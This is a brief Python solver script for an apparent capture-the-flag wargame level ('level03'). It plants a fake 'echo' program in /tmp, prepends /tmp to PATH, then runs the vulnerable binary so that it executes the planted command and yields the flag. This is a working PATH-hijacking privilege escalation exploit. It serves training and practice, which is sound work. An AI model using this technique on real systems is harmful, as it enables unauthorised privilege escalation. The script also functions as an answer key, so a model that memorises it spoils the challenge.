from solver.utils import extract_flag

def solve(connection):
	connection.exec("echo 'getflag' > /tmp/echo && export PATH=/tmp:$PATH && chmod 777 /tmp/echo")
	response = connection.exec("./level03")
	flag = extract_flag(response)
	return "", flag